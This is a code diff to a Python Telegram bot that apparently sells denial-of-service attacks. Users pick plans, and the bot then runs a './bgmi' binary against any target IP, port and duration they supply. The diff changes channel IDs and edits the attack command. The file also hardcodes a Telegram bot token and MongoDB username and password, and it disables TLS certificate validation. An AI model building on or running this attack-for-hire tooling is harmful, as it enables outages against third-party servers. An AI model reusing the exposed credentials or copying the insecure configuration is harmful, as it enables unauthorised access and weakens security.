@@ -18,9 +18,9 @@ loop = asyncio.get_event_loop()
 
 TOKEN = '7105475175:AAHsB8-4VqT-GiqqRdiZ-XUiLs_FLfRrW54'
 MONGO_URI = 'mongodb+srv://piroop:piroop@piro.hexrg9w.mongodb.net/?retryWrites=true&w=majority&appName=piro&tlsAllowInvalidCertificates=true'
-FORWARD_CHANNEL_ID = -1002218272455
-CHANNEL_ID = -1002218272455
-error_channel_id = -1002218272455
+FORWARD_CHANNEL_ID = -1002159070010
+CHANNEL_ID = -1002159070010
+error_channel_id = -1002159070010
 
 logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)
 
@@ -84,7 +84,7 @@ async def start_asyncio_loop():
         await asyncio.sleep(REQUEST_INTERVAL)
 
 async def run_attack_command_async(target_ip, target_port, duration):
-    process = await asyncio.create_subprocess_shell(f"./bgmi {target_ip} {target_port} {duration} 900")
+    process = await asyncio.create_subprocess_shell(f"./bgmi {target_ip} {target_port} {duration}")
     await process.communicate()
 
 def is_user_admin(user_id, chat_id):
@@ -235,7 +235,7 @@ def handle_message(message):
         bot.reply_to(message, "*Instant++ Plan selected*", parse_mode='Markdown')
         attack_command(message)
     elif message.text == "Canary Download✔️":
-        bot.send_message(message.chat.id, "*Please use the following link for Canary Download: https://t.me/SOULCRACKS/10599*", parse_mode='Markdown')
+        bot.send_message(message.chat.id, "*Please use the following link for Canary Download:", parse_mode='Markdown')
     elif message.text == "My Account🏦":
         user_id = message.from_user.id
         user_data = users_collection.find_one({"user_id": user_id})
